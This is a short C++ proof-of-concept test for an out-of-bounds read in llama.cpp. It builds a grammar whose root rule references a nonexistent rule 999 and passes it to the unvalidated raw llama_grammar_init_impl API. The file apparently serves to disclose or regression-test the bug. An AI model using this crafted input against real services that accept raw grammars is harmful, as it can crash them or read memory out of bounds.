// Test: OOB read in llama_grammar_init_impl via invalid RULE_REF
//
// The raw element API (llama_grammar_init_impl with llama_grammar_element**)
// does NOT validate that RULE_REF values are < n_rules. A malicious grammar
// with a RULE_REF value >= n_rules causes OOB read in:
// 1. llama_grammar_detect_left_recursion (rules[rule_index])
// 2. llama_grammar_advance_stack (rules[rule_id])
//
// The string parser path validates in parse(), but the raw API doesn't.

#include "llama.h"
#include "llama-grammar.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>

int main() {
    // Create a minimal grammar with 2 rules:
    // rule 0 (root): RULE_REF(999) END  -- references non-existent rule 999!
    // rule 1: CHAR('a') END
    //
    // When init_impl processes rule 0, it will try to access rules[999]
    // which is OOB since there are only 2 rules.

    std::vector<std::vector<llama_grammar_element>> rules_vec;

    // Rule 0: root ::= <invalid_ref>
    rules_vec.push_back({
        {LLAMA_GRETYPE_RULE_REF, 999},  // OOB reference!
        {LLAMA_GRETYPE_END, 0}
    });

    // Rule 1: a ::= "a"
    rules_vec.push_back({
        {LLAMA_GRETYPE_CHAR, 'a'},
        {LLAMA_GRETYPE_END, 0}
    });

    // Convert to C array
    std::vector<const llama_grammar_element *> rules;
    for (auto & r : rules_vec) {
        rules.push_back(r.data());
    }

    printf("Calling llama_grammar_init_impl with %zu rules...\n", rules.size());
    printf("Rule 0 references rule 999 (only %zu rules exist)\n", rules.size());

    // This should trigger OOB read in detect_left_recursion or advance_stack
    llama_grammar * grammar = llama_grammar_init_impl(
        nullptr,  // vocab
        rules.data(),
        rules.size(),
        0  // start_rule_index
    );

    if (grammar) {
        printf("Grammar created (should have crashed on OOB)\n");
        llama_grammar_free_impl(grammar);
    } else {
        printf("Grammar creation returned NULL\n");
    }

    return 0;
}